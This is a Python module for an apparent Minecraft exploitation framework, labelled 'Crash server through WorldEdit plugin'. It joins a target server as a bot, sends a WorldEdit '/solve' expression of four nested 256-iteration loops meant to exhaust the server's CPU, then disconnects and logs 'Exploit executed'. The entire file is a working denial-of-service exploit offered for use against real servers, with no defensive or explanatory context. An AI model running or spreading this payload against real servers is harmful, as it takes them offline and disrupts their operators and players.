from mcef.module import ModuleBase
from mcef.types import IPv4Address, Port
from mcef.logger import Logger

from mcef.minecraft import JavaServer
from mcef.minecraft.event import ClientEvent

class McEFModule(ModuleBase):
    description = "Crash server through WorldEdit plugin"
    author = "cs"
    date = "07-03-2021"

    def init(self):
        self.add_option(name="rhost", description="Remote host", type=IPv4Address)
        self.add_option(name="rport", description="Remote port", type=Port)

    def execute(self):
        rhost = self.get_option("rhost").value
        rport = self.get_option("rport").value

        server = JavaServer(rhost, rport)
        bot = self.bot

        @bot.eventlistener(ClientEvent.ON_JOIN)
        def _():
            bot.chat_command("/solve", "for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){for(d=0;d<256;d++){ln(pi)}}}}")
            bot.disconnect()

            Logger.success("Exploit executed")

        bot.join_server(server)
